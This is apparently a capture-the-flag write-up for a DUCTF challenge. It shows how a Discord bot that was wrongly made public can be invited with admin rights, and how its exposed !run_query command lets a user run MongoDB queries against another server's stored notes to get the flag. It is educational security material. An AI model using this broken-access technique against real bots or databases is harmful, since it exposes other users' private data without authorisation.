# Solution
This challenges name is a play on the fact that the bot was misconfigured as public, as well as the fact that once we are able to run queries on the database we can query data for other peoples servers.

### Step 1
Create a new discord server.

### Step 2
Invite the bot to our new server by using this url: \
https://discord.com/oauth2/authorize?client_id=738992913652121690&scope=bot&permissions=8

The client ID can be found by right clicking on the bot with developer mode enabled and copying the bots ID. This is a standard way of inviting bots and you can read more about it in the [official Discord developer documentation](https://discord.com/developers/docs/topics/oauth2#bot-vs-user-accounts).\
Normally bots are set to private, however this one was "accidentally" set to public, allowing the public to invite it to their servers.

### Step 3
Now by running `!help` in our own server, we can see that that new admin commands are exposed to us: `!get_server_notes` and `!run_query`
```
Admin:
get_server_notes Returns all of the notes affiliated with this server
run_query        Run a query in the given collection
Notes:
clear            Clear a users notes
note             Start the creation of a new note. Be careful what you note...
notes            Retrieve previously saved notes
No Category:
help             Shows this message

Type !help command for more info on a command.
We can also type !help category for more info on a category.
```
This can be seen by comparing the output of `!help` in a server we are not admin of to one we are an admin of.

The `!run_query` command looks like it will be of some use to us. We can find out more by running `!help run_query` to receive the following output:
```
!run_query <query> <collection>

Run a query in the given collection

Args:
    ctx (commands.Context): Invoking context
    query (str): The query to run, json form
    collection (str): The name of the collection to run the query in.
    It must already exist in the db.
```

### Step 4
Run the `!run_query` command with the server ID for the DUCTF Discord server and a filter to match documents containing the flag.
We can figure out that the backend database is MongoDB via the mention of `collection` and `json form` in the `!run_query` commands help text.\
Another way would be to test it out by running a match-all query on our own server.

```
!run_query {} <server_id>
``` 

Since the flag is stored in the notes of the bot as well as Delta#5000 (me) as hinted in the challenge description, a possible query is:
```
!run_query {\"notes\":{\"$elemMatch\":{\"$regex\":\"DUCTF\"}}} 721605871414542377
```
or
```
!run_query {\"notes\":{\"$elemMatch\":{\"$regex\":\"DUCTF\"}},\"user_id\":177022915747905536} 721605871414542377
```
The DUCTF server ID is found in the same way as the bot ID, by right clicking the DUCTF server icon and clicking copy ID.

Note how we have to escape the double quotes. If we did not we would get no output from the bot. This occurs becase as an exception is thrown due to the [way `discord.py` handles multi-world arguments to commands](https://github.com/Rapptz/discord.py/blob/master/discord/ext/commands/view.py#L172).

We can get a feel for how the data looks by running a match all query:\
```
!run_query {} 721605871414542377
```
However we won't be able to find the flag that way as apparently I really love Crodocile Dundee!

